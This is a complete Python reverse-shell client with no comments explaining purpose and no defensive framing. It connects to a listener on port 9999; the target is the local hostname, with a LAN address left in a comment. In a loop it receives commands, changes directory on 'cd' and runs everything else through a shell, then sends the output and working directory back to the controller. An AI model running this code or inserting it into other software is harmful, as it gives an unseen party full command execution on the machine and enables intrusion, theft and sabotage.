import socket
import sys
import os
import subprocess as sb

s = socket.socket()
host = socket.gethostname()  # '192.168.3.105'
port = 9999

s.connect((host,port))

while True:
    
    data = s.recv(1024)
    if data [ : 2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = sb.Popen(data[:].decode(("utf-8")),shell=True,stdout=sb.PIPE,stdin=sb.PIPE,stderr=sb.PIPE)
        output_bytes = cmd.stdout.read()+cmd.stderr.read()
        output_str = str(output_bytes,'utf-8')
        currentWD = os.getcwd() + '> '
        s.send(str.encode(output_str + currentWD))

        print(output_str)